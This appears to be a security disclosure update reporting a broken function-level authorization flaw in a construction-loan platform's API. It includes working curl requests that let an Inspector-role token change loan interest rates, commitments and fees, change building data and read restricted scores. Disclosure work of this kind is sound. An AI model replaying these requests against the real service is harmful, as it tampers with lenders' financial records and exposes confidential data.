# Update: Multi-Role Confirmation — BFLA Affects All Tested Roles

## Overview

Further testing with the **Inspector role** confirms the BFLA is systemic and not limited to the Borrower role. The Inspector — the lowest-privilege role on the platform — can modify Lender-restricted project fields (loan commitment, interest rate, lender fees) and access restricted score data, despite having all relevant edit permissions set to `enabled: false`.

This demonstrates the permission bypass affects **every role on the platform**, not just Borrower.

---

## Inspector Role Test Results

### Test 1: Inspector Modifies Loan Fields (Persistence Confirmed)

**Permission bypassed:** `projects_details_edit: false`

```bash
curl -X PATCH 'https://backend.trustpoint.ai/api/v1/projects/<project_id>/' \
  -H 'Authorization: Bearer <inspector_token>' \
  -H 'Content-Type: application/json' \
  -d '{"loan": {"interest_rate": "88.88", "loc_commitment": 999999.99, "lender_fees": 50000}}'
```

**Result:** `200 OK` — All three Lender-restricted financial fields accepted and persisted.

**Verification GET confirmed:**
```
loan.interest_rate: 88.88
loan.loc_commitment: 999999.99
loan.lender_fees: 50000.0
PERSISTENCE CONFIRMED
```

An Inspector — a third-party user whose sole function is site inspections — can modify the loan commitment amount, interest rate, and lender fees on a construction loan.

---

### Test 2: Inspector Accesses Scores (Should Be Denied)

**Permission bypassed:** `scores_view: false`

```bash
curl -s 'https://backend.trustpoint.ai/api/v1/projects/<project_id>/scores/' \
  -H 'Authorization: Bearer <inspector_token>'
```

**Result:** `200 OK` — Full risk/compliance score data returned (budget_score, schedule_score, policy_score, other_score — all with factors and flags). Inspector gains visibility into internal risk assessments intended only for Lender users.

---

### Test 3: Inspector Modifies Building Data

**Permission bypassed:** `projects_details_edit: false`

```bash
curl -X PATCH 'https://backend.trustpoint.ai/api/v1/projects/<project_id>/buildings/<building_id>/' \
  -H 'Authorization: Bearer <inspector_token>' \
  -H 'Content-Type: application/json' \
  -d '{"name": "Inspector-Modified Building", "description": "Modified by inspector role"}'
```

**Result:** `200 OK` — Building name and description modified and persisted.

---

## Cross-Role Comparison Matrix

| Endpoint | Permission Flag | Borrower | Inspector | Expected |
|----------|----------------|----------|-----------|----------|
| PATCH project loan fields | `projects_details_edit: false` | **200 OK** | **200 OK** | 403 |
| PATCH building data | `projects_details_edit: false` | **200 OK** | **200 OK** | 403 |
| GET scores | `scores_view: false` | **200 OK** | **200 OK** | 403 |
| PATCH own company | `company_edit: false` | **200 OK** | 403 | 403 |
| PATCH Lender company (cross-company) | `company_edit: false` | **200 OK** | 403 | 403 |
| POST draw request APPROVE | `drawrequests_approve: false` | 403 | 403 | 403 |

---

## Analysis

### What This Proves

1. **Project-level BFLA is systemic across ALL roles.** Both Borrower (external participant) and Inspector (third-party contractor) can modify Lender-restricted financial fields. The permission flags are not checked on any project write endpoint regardless of the user's role.

2. **Company-level authorization is inconsistently applied.** Inspector is blocked from company writes (both own company and cross-company), while Borrower is not. This suggests company endpoints have a partial authorization layer that checks user type but not permission flags.

3. **Only financial approval actions are consistently protected.** Draw request APPROVE/FINALIZE/mark_as_paid correctly return `403` for both roles — confirming the backend CAN enforce permissions but only does so on these specific actions.

### Why Inspector Access Is Especially Concerning

The Inspector role is a **third-party contractor** with the narrowest intended scope on the platform — they should only be able to submit inspection reports and photos. An Inspector modifying loan commitment amounts, interest rates, and lender fees represents a severe privilege escalation. These fields directly impact:

- Construction loan disbursement calculations
- Interest accrual on multi-million dollar loans
- Lender fee structures and profitability

---

## All Values Reverted

All test modifications were reverted to original values after verification:
- `loan.interest_rate` → reverted to `null`/`0.0`
- `loan.loc_commitment` → reverted to `0.0`
- `loan.lender_fees` → reverted to `0.0`
- Building name → reverted to original
